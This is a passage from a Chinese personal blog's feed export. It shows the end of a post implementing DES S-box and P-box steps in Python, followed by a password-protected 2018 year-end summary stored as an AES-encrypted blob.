   <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment"># S盒过程</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">s_box</span><span class="params">(my_str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(my_str),<span class="number">6</span>):</span><br><span class="line">        now_str = my_str[i:i+<span class="number">6</span>]</span><br><span class="line">        row = int(now_str[<span class="number">0</span>]+now_str[<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">        col = int(now_str[<span class="number">1</span>:<span class="number">5</span>],<span class="number">2</span>)</span><br><span class="line">        num = bin(S[c][row*<span class="number">16</span> + col])[<span class="number">2</span>:]   <span class="comment">#利用了bin输出有可能不是4位str类型的值，所以才有下面的循环并且加上字符0</span></span><br><span class="line">        <span class="keyword">for</span> gz <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>-len(num)):</span><br><span class="line">            num = <span class="string">'0'</span>+ num</span><br><span class="line">        res += num</span><br><span class="line">        c  += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="comment">#P盒置换</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">p_box</span><span class="params">(bin_str)</span>:</span></span><br><span class="line">    res = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span>  P:</span><br><span class="line">        res += bin_str[i<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h3 id="正确性"><a href="#正确性" class="headerlink" title="正确性"></a>正确性</h3><p>加密解密内容都会放到文件里面，然后通过读写文件的方式将内容成功加解密，以”helloworld”为例，能够正确加解密</p><p><img src="https://s2.ax1x.com/2019/01/01/F51J8s.png" alt="F51J8s.png"></p><h3 id="详细代码-放在github上了-：DES加解密"><a href="#详细代码-放在github上了-：DES加解密" class="headerlink" title="详细代码(放在github上了)：DES加解密"></a>详细代码(放在github上了)：<a href="https://github.com/0v3rW4tch/Cryptography-course-design" target="_blank" rel="noopener">DES加解密</a></h3>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;DES是分组密码的一类，是一种对称密码技术，使用了Feistel的网络结构
    
    </summary>
    
      <category term="密码学" scheme="0verwatch.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
    
      <category term="密码学" scheme="0verwatch.top/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>2018嘅總結</title>
    <link href="0verwatch.top/writing-2.html"/>
    <id>0verwatch.top/writing-2.html</id>
    <published>2018-12-30T03:31:45.000Z</published>
    <updated>2018-12-30T07:25:25.752Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">请输入密码</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> 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